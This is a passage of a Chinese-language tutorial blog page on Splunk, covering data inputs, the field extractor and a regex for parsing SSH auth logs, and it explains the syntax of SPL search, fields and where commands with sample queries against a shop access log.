href="http://docs.splunk.com/Documentation/Splunk/9.2.2/Data/Monitornetworkports">从TCP和UDP端口获取数据</a>.</p></li><li><p>要获取SNMP数据,请参阅<a href="http://docs.splunk.com/Documentation/Splunk/9.2.2/Data/SendSNMPeventstoSplunk">将SNMP事件发送到Splunk部署</a>.</p></li></ul><h3 id="Windows数据"><a href="#Windows数据" class="headerlink" title="Windows数据"></a>Windows数据</h3><p>Splunk Enterprise的Windows版本直接接受各种Windows特定的输入.使用Splunk Web可以配置以下Windows特定的输入类型:</p><ul><li>Windows Event Log data —&gt; Windows事件日志数据</li><li>Windows Registry data  —&gt; Windows注册表数据</li><li>Windows Management Instrumentation (WMI) data </li><li>Active Directory data —&gt;Active Directory数据</li><li>Performance monitoring data —&gt; 性能监控数据</li></ul><h3 id="Other-sources-其他来源"><a href="#Other-sources-其他来源" class="headerlink" title="Other sources 其他来源"></a>Other sources 其他来源</h3><p>Splunk Enterprise可以直接收集以下数据源:</p><ul><li>使用HTTP事件收集器直接从具有HTTP或HTTPS协议的源获取数据.请参阅<a href="http://docs.splunk.com/Documentation/Splunk/9.2.2/Data/UsetheHTTPEventCollector">HTTP事件收集器端点</a></li><li>从技术基础设施、安全系统和业务应用程序中获取指标数据.请参阅<a href="http://docs.splunk.com/Documentation/Splunk/9.2.2/Metrics/Overview">Metrics</a></li><li>监视先进先出(FIFO)队列.请参阅<a href="http://docs.splunk.com/Documentation/Splunk/9.2.2/Data/MonitorFIFOqueues">监控先进先出(FIFO)队列</a></li><li>从API和其他远程数据接口以及消息队列获取数据.请参阅<a href="http://docs.splunk.com/Documentation/Splunk/9.2.2/Data/Getdatafromscriptedinputs">脚本输入</a></li><li>定义自定义输入功能来扩展Splunk Enterprise框架.请参阅<a href="https://dev.splunk.com/enterprise/docs/developapps/manageknowledge/custominputs/?_gl=1*1k0yj7t*_ga*MTYwNDYxMDI1Ni4xNzIxMjE3MTAw*_ga_GS7YF8S63Y*MTcyMTI4NjczOC44LjEuMTcyMTI4NzcwMi41MS4wLjA.*_gcl_au*OTkyNDc4NzQ1LjE3MjEyMTcxMDA.*FPAU*OTkyNDc4NzQ1LjE3MjEyMTcxMDA.*_ga_5EPM2P39FV*MTcyMTI4MjAxMy42LjEuMTcyMTI4NzcwMi4wLjAuNDcyNjc3OTUx">Splunk开发者门户上的为Splunk Cloud Platform或Splunk Enterprise创建自定义数据输入</a></li></ul><h2 id="导入索引数据"><a href="#导入索引数据" class="headerlink" title="导入索引数据"></a>导入索引数据</h2><p>示例:<code>shop_access.log</code></p><ol><li><p>导入数据—&gt;点击下一步</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181105038.png" data-fancybox="true"/></div></div></li><li><p>点击—&gt;下一步,事件换行选择每行 名称及描述随便写</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181105166.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181105917.png" data-fancybox="true"/></div></div></li><li><p>点击检查—&gt;提交</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181105709.png" data-fancybox="true"/></div></div></li><li><p>上传成功后,点击搜索开始浏览数据叭~~~</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181105149.png" data-fancybox="true"/></div></div></li></ol><h2 id="字段提取器"><a href="#字段提取器" class="headerlink" title="字段提取器"></a>字段提取器</h2><p>Splunk提供了一种非常简单的方式来提取字段,就是使用字段提取器,即使在你完全不了解正则表达式的情况下,也可以轻松完成字段提取.</p><ol><li><p>执行事件搜索,左边栏往下,单击提取新字段,进入字段提取器.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181105837.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181105469.png" data-fancybox="true"/></div></div></li><li><p>在事件列表中,选择一个需要进行字段提取的示例事件–&gt;点击该事件—&gt;下一步.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181105574.png" data-fancybox="true"/></div></div></li><li><p>Splunk提供了两种字段提取的方法:正则表达式和分隔符.正则表达式主要用于非结构化数据；而基于表格的结构化数据,使用分隔符即可.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181105442.png" data-fancybox="true"/></div></div></li><li><p>选择需要字段提取的值,下面会出现对话框,对字段名称进行命名.一般我们也可手动编辑正则表达式进行调整.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181423162.png" data-fancybox="true"/></div></div></li><li><p>设置完成后点击下一步.可以对提取名称和权限进行设置,点击完成来保存提取.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181105069.png" data-fancybox="true"/></div></div></li><li><p>开始搜索,选择所有字段,隐藏自带的字段,选择我们新增的字段</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181105408.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181105755.png" data-fancybox="true"/></div></div></li><li><p>即可看到我们新增的字段内容</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181106313.png" data-fancybox="true"/></div></div></li><li><p>正则表达式提取<code>secure</code>中的相关字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">^(?P&lt;timestamp&gt;\w&#123;3&#125; \d&#123;2&#125; \d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;) (?P&lt;hostname&gt;\S+) (?P&lt;process&gt;\S+)\[(?P&lt;pid&gt;\d+)\]: (?P&lt;action&gt;.+) <span class="keyword">for</span> (?P&lt;user&gt;\S+) from (?P&lt;source_ip&gt;\d+\.\d+\.\d+\.\d+) port (?P&lt;source_port&gt;\d+) (?P&lt;protocol&gt;\S+)$</span><br><span class="line"></span><br><span class="line"><span class="comment">#  (?P&lt;name&gt;...)命名</span></span><br><span class="line"><span class="comment"># \S+: 匹配一个或多个非空白字符</span></span><br><span class="line"><span class="comment"># \d+: 匹配一个或多个数字</span></span><br><span class="line"><span class="comment"># .+: 匹配任意字符(包括空格）</span></span><br><span class="line"><span class="comment"># ^(?P&lt;timestamp&gt;\w&#123;3&#125; \d&#123;2&#125; \d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;)        # 匹配时间戳部分，格式为 &quot;MMM DD HH:MM:SS&quot;</span></span><br><span class="line"><span class="comment"># (?P&lt;hostname&gt;\S+)                                    # 匹配主机名，非空白字符</span></span><br><span class="line"><span class="comment"># (?P&lt;process&gt;\S+)                                    # 匹配进程名，非空白字符</span></span><br><span class="line"><span class="comment"># \[(?P&lt;pid&gt;\d+)\]:                                     # 匹配进程 ID，在方括号内，包含一个或多个数字</span></span><br><span class="line"><span class="comment"># (?P&lt;action&gt;.+)                                       # 匹配动作，包含一个或多个任意字符(贪婪匹配）</span></span><br><span class="line"><span class="comment"># for (?P&lt;user&gt;\S+)                                    # 匹配 &quot;for&quot; 后面的用户名，非空白字符</span></span><br><span class="line"><span class="comment"># from (?P&lt;source_ip&gt;\d+\.\d+\.\d+\.\d+)              # 匹配源 IP 地址，格式为四个由点分隔的数字</span></span><br><span class="line"><span class="comment"># port (?P&lt;source_port&gt;\d+)                            # 匹配源端口号，包含一个或多个数字</span></span><br><span class="line"><span class="comment"># (?P&lt;protocol&gt;\S+)$                                   # 匹配协议，非空白字符，行结束</span></span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407191109804.png" data-fancybox="true"/></div></div></li></ol><h2 id="搜索命令"><a href="#搜索命令" class="headerlink" title="搜索命令"></a>搜索命令</h2><h3 id="基本搜索与过滤命令"><a href="#基本搜索与过滤命令" class="headerlink" title="基本搜索与过滤命令"></a>基本搜索与过滤命令</h3><h4 id="search"><a href="#search" class="headerlink" title="search"></a>search</h4><p>使用 <code>search</code> 命令可以从索引中检索事件或过滤先前搜索结果.它可以使用关键字、带引号的短语、通配符和字段值表达式来查找事件.</p><ul><li><strong>隐含使用</strong>:在任何搜索的开头，<code>search</code> 命令是隐含的，你无需显式地写它.</li><li><strong>过滤结果</strong>:你可以在搜索中使用 <code>search</code> 命令来过滤管道中上一个命令的结果.</li></ul><p>通过检索事件后，你可以使用其他命令进行转换、筛选和报告.使用竖线(|）或管道字符将这些命令链接到检索到的事件.</p><div class="tag-plugin colorful note" color="error"><div class="title">注意!!!</div><div class="body"><p><code>search</code> 命令支持使用CIDR表示法的IPv4和IPv6地址以及IP地址.</p></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181931906.png" data-fancybox="true"/></div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line">search &lt;logical-expression&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须参数</span></span><br><span class="line">&lt;logical-expression&gt;</span><br><span class="line"><span class="comment"># 语法: &lt;逻辑表达式&gt; | &lt;时间选项&gt; | &lt;搜索修饰符&gt; | NOT &lt;逻辑表达式&gt; | &lt;索引表达式&gt; | &lt;比较表达式&gt; | &lt;逻辑表达式&gt; [OR] &lt;逻辑表达式&gt;</span></span><br><span class="line">语法: &lt;logical-expression&gt; | &lt;time-opts&gt; | &lt;search-modifier&gt; | NOT &lt;logical-expression&gt; | &lt;index-expression&gt; | &lt;comparison-expression&gt; | &lt;logical-expression&gt; [OR] &lt;logical-expression&gt;</span><br><span class="line">描述: 包含用于描述要从索引中检索的事件的所有关键字或字段-值对.根据需要包含括号.使用布尔表达式、比较运算符、时间修饰符、搜索修饰符或这些表达式的组合作为此参数.</span><br><span class="line">AND 运算符总是在术语和表达式之间隐含的.例如，web error 与 web AND error 相同.指定 clientip=192.0.2.255 earliest=-1h@h 与 clientip=192.0.2.255 AND earliest=-1h@h 相同.因此，除非出于清晰原因需要包含它，否则不需要指定 AND 运算符.</span><br></pre></td></tr></table></figure><h5 id="逻辑表达式"><a href="#逻辑表达式" class="headerlink" title="逻辑表达式"></a>逻辑表达式</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 比较表达式</span></span><br><span class="line">语法: &lt;字段&gt;&lt;比较运算符&gt;&lt;值&gt; | &lt;字段&gt; IN (&lt;值列表&gt;)</span><br><span class="line">描述: 将字段与文字值进行比较，或提供字段中可以出现的值列表.</span><br><span class="line">语法: = | != | &lt; | &lt;= | &gt; | &gt;=</span><br><span class="line">描述: 在搜索字段/值对时可以使用比较运算符.使用等于 ( = ) 或不等于 ( != ) 运算符的比较表达式比较字符串值.例如，<span class="string">&quot;1&quot;</span> 不匹配 <span class="string">&quot;1.0&quot;</span>.使用大于或小于运算符 &lt; &gt; &lt;= &gt;= 的比较表达式对两个数字进行数值比较，对其他值进行字典顺序比较.参见用法.</span><br><span class="line"></span><br><span class="line">&lt;field&gt;</span><br><span class="line">语法: &lt;字符串&gt;</span><br><span class="line">描述: 字段的名称.</span><br><span class="line"></span><br><span class="line">&lt;value&gt;</span><br><span class="line">语法: &lt;文字值&gt;</span><br><span class="line">描述: 在比较表达式中，字段的文字数字或字符串值.</span><br><span class="line"></span><br><span class="line">&lt;value-list&gt;</span><br><span class="line">语法: (&lt;文字值&gt;, &lt;文字值&gt;, ...)</span><br><span class="line">描述: 与 IN 运算符一起使用，指定两个或更多值.例如，使用 error IN (400, 402, 404, 406) 而不是 error=400 OR error=402 OR error=404 OR error=406.</span><br></pre></td></tr></table></figure><h5 id="索引表达式"><a href="#索引表达式" class="headerlink" title="索引表达式"></a>索引表达式</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">语法: <span class="string">&quot;&lt;字符串&gt;&quot;</span> | &lt;术语&gt; | &lt;搜索修饰符&gt;</span><br><span class="line">描述: 使用文字字符串和搜索修饰符描述要从索引中检索的事件.</span><br><span class="line"><span class="comment"># 索引表达式选项</span></span><br><span class="line">&lt;string&gt;</span><br><span class="line">语法: <span class="string">&quot;&lt;string&gt;&quot;</span></span><br><span class="line">描述: 指定要匹配的关键字或带引号的短语.在搜索字符串和带引号的字符串(不是搜索修饰符的任何内容）时，Splunk 软件会在 _raw 字段中搜索匹配的事件或结果.</span><br><span class="line"></span><br><span class="line">&lt;search-modifier&gt;</span><br><span class="line">语法:  &lt;sourcetype-specifier&gt; | &lt;host-specifier&gt; | &lt;hosttag-specifier&gt; | &lt;source-specifier&gt; | &lt;savedsplunk-specifier&gt; | &lt;eventtype-specifier&gt; | &lt;eventtypetag-specifier&gt; | &lt;splunk_server-specifier&gt;</span><br><span class="line">描述: 搜索来自指定字段或字段标签的事件.例如，搜索一个或多个主机、来源、来源类型、保存的搜索和事件类型的组合.还可以搜索字段标签，格式为:tag::&lt;字段&gt;=&lt;字符串&gt;.</span><br><span class="line">更多关于使用默认字段进行搜索的信息，请参阅知识管理器手册.</span><br><span class="line">更多关于使用标签和字段别名的信息，请参阅知识管理器手册.</span><br><span class="line"></span><br><span class="line">&lt;sourcetype-specifier&gt;</span><br><span class="line">语法: sourcetype=&lt;字符串&gt;</span><br><span class="line">描述: 搜索来自指定来源类型字段的事件.</span><br><span class="line"></span><br><span class="line">&lt;host-specifier&gt;</span><br><span class="line">语法: host=&lt;字符串&gt;</span><br><span class="line">描述: 搜索来自指定主机字段的事件.</span><br><span class="line"></span><br><span class="line">&lt;hosttag-specifier&gt;</span><br><span class="line">语法: hosttag=&lt;字符串&gt;</span><br><span class="line">描述: 搜索具有被字符串标记的主机的事件.</span><br><span class="line"></span><br><span class="line">&lt;eventtype-specifier&gt;</span><br><span class="line">语法: eventtype=&lt;字符串&gt;</span><br><span class="line">描述: 搜索与指定事件类型匹配的事件.</span><br><span class="line"></span><br><span class="line">&lt;eventtypetag-specifier&gt;</span><br><span class="line">语法: eventtypetag=&lt;字符串&gt;</span><br><span class="line">描述: 搜索所有被字符串标记的事件类型匹配的事件.</span><br><span class="line"></span><br><span class="line">&lt;savedsplunk-specifier&gt;</span><br><span class="line">语法: savedsearch=&lt;字符串&gt; | savedsplunk=&lt;字符串&gt;</span><br><span class="line">描述: 搜索由指定保存的搜索找到的事件.</span><br><span class="line"></span><br><span class="line">&lt;source-specifier&gt;</span><br><span class="line">语法: <span class="built_in">source</span>=&lt;字符串&gt;</span><br><span class="line">描述: 搜索来自指定来源字段的事件.</span><br><span class="line"></span><br><span class="line">&lt;splunk_server-specifier&gt;</span><br><span class="line">语法: splunk_server=&lt;字符串&gt;</span><br><span class="line">描述: 搜索来自特定服务器的事件.使用 <span class="string">&quot;local&quot;</span> 指代搜索头.</span><br></pre></td></tr></table></figure><h5 id="时间表达式"><a href="#时间表达式" class="headerlink" title="时间表达式"></a>时间表达式</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">语法: [&lt;时间格式&gt;] (&lt;时间修饰符&gt;)...</span><br><span class="line">描述: 描述搜索的开始时间和结束时间术语的格式.参见时间选项.</span><br><span class="line"></span><br><span class="line">&lt;timeformat&gt;</span><br><span class="line">语法: timeformat=&lt;字符串&gt;</span><br><span class="line">描述: 设置开始时间和结束时间术语的时间格式.</span><br><span class="line">默认: timeformat=%m/%d/%Y:%H:%M:%S.</span><br><span class="line"></span><br><span class="line">&lt;time-modifier&gt;</span><br><span class="line">语法: starttime=&lt;字符串&gt; | endtime=&lt;字符串&gt; | earliest=&lt;时间修饰符&gt; | latest=&lt;时间修饰符&gt;</span><br><span class="line">描述: 使用相对或绝对时间指定开始和结束时间.</span><br><span class="line">您还可以使用 earliest 和 latest 属性为您的搜索指定绝对和相对时间范围.有关此时间修饰符语法的更多信息，请参阅搜索手册中的指定搜索中的时间修饰符.</span><br><span class="line"></span><br><span class="line">starttime</span><br><span class="line">语法: starttime=&lt;字符串&gt;</span><br><span class="line">描述: 事件必须晚于或等于此时间.必须匹配时间格式.</span><br><span class="line"></span><br><span class="line">endtime</span><br><span class="line">语法: endtime=&lt;字符串&gt;</span><br><span class="line">描述: 所有事件必须早于或等于此时间.</span><br></pre></td></tr></table></figure><p>当搜索是搜索中的第一个命令时，您可以使用关键字、短语、字段、布尔表达式和比较表达式等术语来精确指定要从 Splunk 索引中检索哪些事件.如果您没有指定字段，搜索会在<code> _raw</code> 字段中查找这些术语.</p><p>一些搜索术语的例子包括:</p><ul><li>关键字:<code>error login == error AND login </code></li><li>引用的短语:<code>&quot;database error&quot;</code></li><li>布尔运算符:<code>login NOT (error OR fail) </code></li><li>通配符:<code>fail* </code></li><li>字段-值对:<code>status=404, status!=404, 或 status&gt;200 </code></li></ul><mark class="tag-plugin colorful mark" color="red">注意!!! 要搜索字段值是 SPL 运算符或关键字的情况则需要转义~</mark><h5 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h5><p>在使用搜索命令时，如果短语或字段值中包含空格、逗号、管道、引号或括号，你需要用引号将它们括起来.引号必须是成对出现的.例如:</p><ul><li>搜索 <code>error | stats count</code> 会统计包含“error”这个词的事件数量.</li><li>搜索 <code>... | search &quot;error | stats count&quot;</code> 会返回包含<code>error</code>、<code>|</code>、<code>stats</code>和<code>count</code>按顺序出现的事件.</li></ul><p>如果你想把某些关键字当作普通的字符串对待，而不是它们的默认含义，比如布尔运算符或特定的字段&#x2F;值对，你也需要用引号把它们括起来.例如:</p><ul><li>搜索 <code>error &quot;AND&quot;</code> 会查找包含<code>AND</code>这个词的事件.</li><li>搜索 <code>error &quot;startswith=foo&quot;</code> 会查找包含<code>startswith=foo</code>这个短语的事件.</li></ul><p>反斜杠(\）可以用来转义特殊字符，比如引号、管道和反斜杠本身.例如:</p><ul><li><code>\&quot;</code> 会被当作字符串引号.</li><li><code>\\</code> 会被当作字符串反斜杠.</li><li><code>\|</code> 会被当作字符串管道.</li></ul><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><ol><li><p>比较两个字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | <span class="built_in">where</span> fieldsA=fieldsB</span><br></pre></td></tr></table></figure></li><li><p>对于不相等的比较，您可以通过多种方式指定条件.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | <span class="built_in">where</span> fieldA!=fieldB</span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | <span class="built_in">where</span> NOT fieldA=fieldB</span><br></pre></td></tr></table></figure></li><li><p>使用IN运算符进行多个字段值比较</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | status IN(200,301,302,500)</span><br><span class="line"><span class="comment"># 包含字符</span></span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | status IN(error,warning)</span><br><span class="line"><span class="comment"># NOT运算符与IN运算符一起使用</span></span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | NOT clientip IN (211.166.11.101, 182.236.164.11, 128.241.220.82)</span><br></pre></td></tr></table></figure></li><li><p>CIDR匹配</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">search 命令可以对包含IPv4和IPv6地址的字段执行CIDR匹配.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 ip 字段包含以下值:</span></span><br><span class="line">172.32.162.49</span><br><span class="line">172.32.172.59</span><br><span class="line">172.32.172.84</span><br><span class="line">172.32.229.172</span><br><span class="line">172.33.114.186</span><br><span class="line">172.33.117.114</span><br><span class="line">172.33.117.18</span><br><span class="line">172.33.117.38</span><br><span class="line">172.33.117.63</span><br><span class="line">172.33.117.97</span><br><span class="line">172.33.118.158</span><br><span class="line">172.33.127.119</span><br><span class="line">172.33.127.122</span><br><span class="line">172.33.127.131</span><br><span class="line">172.33.127.147</span><br><span class="line">172.33.127.155</span><br><span class="line">172.33.127.172</span><br><span class="line">172.33.127.205</span><br><span class="line">172.33.127.68</span><br><span class="line">172.33.127.88</span><br><span class="line">172.33.127.90</span><br><span class="line">172.33.127.97</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> status=200 | stats count by ip | search ip=<span class="string">&quot;172.33.127.0/24&quot;</span></span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181932409.png" data-fancybox="true"/></div></div></li><li><p>字段值对匹配</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 源IP等于10.9.165.* 或者 目的IP等于10.9.165.8</span></span><br><span class="line">src=<span class="string">&quot;10.9.165.*&quot;</span> OR dst=<span class="string">&quot;10.9.165.8&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>使用布尔运算符和比较运算符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> (status=200 OR status=304) ip!=<span class="string">&quot;172.33.127.97&quot;</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> status IN(200,304) ip!=<span class="string">&quot;172.33.127.97&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>使用通配符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> (status=3* OR status=4*)</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> status IN(4*, 5*)</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181932132.png" data-fancybox="true"/></div></div></li></ol><h4 id="fields"><a href="#fields" class="headerlink" title="fields"></a>fields</h4><p>根据字段列表条件保留或删除搜索结果中的字段.</p><p>默认情况下，内部字段 <code>_raw</code> 和 <code>_time</code> 包含在Splunk Web的输出中.使用 <code>outputcsv</code> 命令可以在输出中包含其他内部字段.参见用法.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line">fields [+|-] &lt;wc-field-list&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须参数</span></span><br><span class="line">&lt;wc-field-list&gt;</span><br><span class="line">    语法: &lt;字段&gt;, &lt;字段&gt;, ...</span><br><span class="line">    描述: 要保留或删除的字段的逗号分隔列表.可以使用星号(*）作为通配符来指定具有相似名称的字段列表.例如，如果你想指定所有以 <span class="string">&quot;value&quot;</span> 开头的字段，可以使用通配符，如 value*.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选参数</span></span><br><span class="line">+ | -</span><br><span class="line">    语法: + | -</span><br><span class="line">    描述: 如果指定加号(+）符号，则仅保留 wc-field-list 中的字段在结果中.如果指定减号(-）符号，则从结果中删除 wc-field-list 中的字段.</span><br><span class="line">    默认值: +</span><br></pre></td></tr></table></figure><h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><ol><li><p>从结果中删除 <code>length</code> 和 <code>response_time</code> 字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | fields - length, response_time</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407182103766.png" data-fancybox="true"/></div></div></li><li><p>仅保留 <code>host</code> 和 <code>ip</code> 字段.删除所有内部字段.内部字段开始以下划线字符开头，例如 <code>_time</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | fields length, response_time| fields - *</span><br></pre></td></tr></table></figure></li><li><p>仅保留字段 <code>source</code> 、 <code>sourcetype</code> 、 <code>host</code> 以及所有以 <code>error</code> 开头的字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | fields <span class="built_in">source</span>, sourcetype, host, error*</span><br></pre></td></tr></table></figure></li></ol><h4 id="where"><a href="#where" class="headerlink" title="where"></a>where</h4><p><code>where</code> 命令使用<code>eval-expressions</code>来过滤搜索结果.这些<code>eval-expressions</code>必须是布尔表达式，其中表达式返回<code>true</code>或<code>false</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line"><span class="built_in">where</span> &lt;eval-expression&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须参数</span></span><br><span class="line">eval-expression</span><br><span class="line">语法: 